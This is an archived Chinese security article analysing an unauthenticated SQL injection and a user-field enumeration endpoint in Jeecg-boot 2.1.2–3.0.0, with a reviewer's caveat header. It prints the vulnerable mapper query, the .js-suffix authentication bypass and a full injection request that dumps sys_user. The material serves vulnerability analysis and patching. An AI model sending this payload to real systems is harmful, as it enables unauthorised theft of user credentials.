---
source: "gelusus/wxvl 公众号漏洞文库"
product: "JeecgBoot/NgAlain字典SQL注入与用户属性枚举"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Jeecg-boot v2.1.2-v3.0.0 SQL注入漏洞+敏感接口分析"
prerequisites: "来源所述条件，未列明部分仍待核：声称2.1.2至3.0.0，二开系统测试；需静态后缀anon规则和特定控制器存在"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-ca91a3f3366542b9b68081af"
entity_id: "ve-ca91a3f3366542b9b68081af"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：声称2.1.2至3.0.0，二开系统测试；需静态后缀anon规则和特定控制器存在

代码与实验材料：Controller/mapper片段、.js绕过及checkOnlyUser枚举；关键认证配置/结果依图，/api是实例上下文

来源证据范围：chobits02/C4原创，无具体上游tag/patch

- **结论使用边界（1）**：数据库和密码算法表述未被代码证明；依据：table参数是表表达式非任意数据库；仅PasswordUtil.encrypt签名不能证明带盐MD5算法，需要实际实现。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：指纹与版本范围过度泛化；依据：称唯一特征验证码接口；二开实例不能证明所有2.1.2至3.0.0默认配置相同；checkOnlyUser需要区分存在性布尔泄漏与直接返回敏感数据。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  Jeecg-boot v2.1.2-v3.0.0 SQL注入漏洞+敏感接口分析  
原创 chobits02  C4安全   2025-07-21 06:21  
  
前言  
#### 短期攻防结束了，公司几个系统的漏洞就给到了开发的手里，仔细一看都是用相同开源框架二次开发而来的，版本都比较老了，都是基于Jeecg-boot二次开发  
#### 该系统在v2.1.2-v3.0.0版本中存在SQL注入漏洞，还有其他敏感接口，下面就分析看下  
#### Jeecg-boot是北京国炬信息技术有限公司开发的低代码开发框架  
  
![](../../.resource/remote/3bdc3c5bc096cc627fd25b5e27c0923130ba6c268cd57f99a4211e4164f8caec.png "")  
#### 框架只是个后端Java框架，前端都是不一样的，唯一能判断的特征可能是系统自带的验证码接口，如下  
```
/api/sys/randomImage/一串数字
```  
  
![](../../.resource/remote/df8d698e9f1f0c561d01b1408f4362aceda7b6878c3e790668af6822e9ba8d5e.png "")  
  
  
然后直接来到漏洞接口地址  
```
/api/sys/ng-alain/getDictItemsByTable
```  
  
方法位于  
NgAlainController当中  
  
![](../../.resource/remote/68f99ec88e496a9e130d70eb3a650700b411e9c589c849175c7f41c3f93d3442.png "")  
```
@RequestMapping(value = "/getDictItemsByTable/{table}/{key}/{value}", method = RequestMethod.GET)
public Object getDictItemsByTable(@PathVariable String table,@PathVariable String key,@PathVariable String value) {    
  return this.ngAlainService.getDictByTable(table,key,value);
}
```  
  
然后根据service层追踪到mapper层  
  
![](../../.resource/remote/13d633e69704435d2df4c097b4c870b04c03269c643ed0eb246d4ec33e579a2a.png "")  
  
可以看到参数直接可以指定查询的数据库  
  
![](../../.resource/remote/8b4a5b2a3a204f8cfce2e53d5575f6251e3c5ca3eb46b9056c550ba8a804da01.png "")  
```
@Select("select ${key} as \"label\",${value} as \"value\" from ${table}")
```  
  
这里key和value可以指定任意数据库的两个字段，然后table可以指定任意数据库  
  
不过直接请求这个接口是需要鉴权的，这就要提到接口放行的配置了  
  
  
可以注意到这个接口传参是以  
/getDictItemsByTable/{table}/{key}/{value}  
  
通过斜杠传参，而看系统放行配置，存在匹配任意URL，只要结尾是文件格式的即可放行  
  
![](../../.resource/remote/4309890d899d5c535639abac3f5c5491a8a291e56cae6d975afca2f1efd441da.png "")  
  
两者结合一下就能造成未授权的SQL注入漏洞了，一般都是查sys_user这个自带表  
```
GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
Host: 
sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
Sec-Fetch-Dest: empty
Accept: application/json, text/plain, */*
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
```  
  
![](../../.resource/remote/baed6dba57d0166c5ae48f9bffe4e89d791bd4f0d8409bad4d5c55d9021d300a.png "")  
  
不过你懂得，这些密码是带盐值加密的MD5，逆向推出明文需要先生成数据库之后碰撞，而系统里面的密码是这么个加密逻辑：  
```
PasswordUtil.encrypt(username, password, salt);
```  
  
通过用户名、明文密码、盐值三者加密而来，所以一般想破解你还要下载框架自己加密一个字典，还挺麻烦的  
  
  
然后下面一个接口是  
/api/sys/user/checkOnlyUser  
  
![](../../.resource/remote/8c31d420fc0acdcbf37603e9e3d99144b21c9d79c99825fe99558ec12d6f482b.png "")  
  
同样无需鉴权，很简单用QueryWrapper查用户  
  
![](../../.resource/remote/c197159c7ac4f683decddf41ce8cdcbbddde3afa55ac820e817b5bdbdfb1e1bb.png "")  
  
只要是SysUser里的字段，你都能查询是否有对应的用户有这个字段的值  
  
![](../../.resource/remote/90306bb860a5f637de3e83f6cd86226696723cb3b35c6778ade881f359957298.png "")  
  
username、realname、password、salt、email等等，都能爆破是否存在  
  
![](../../.resource/remote/e653ff702f2977c1b1828897111e5d3370357e28cfd0cedc4db2a5522e998396.png "")  
  
![](../../.resource/remote/be6b49a9abbfdc2d4ee214075906b34a79d96640743d7281c1b88664261af51e.png "")  
  
但是用处不大  
  
  
结语  
  
感兴趣的可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
  
**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可。**  
  
****  
![图片](../../.resource/remote/55259e9e53edfa43284d3246bc0572f6a983228f256b9c58334940d20b14bd07.gif "")  
  
END  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
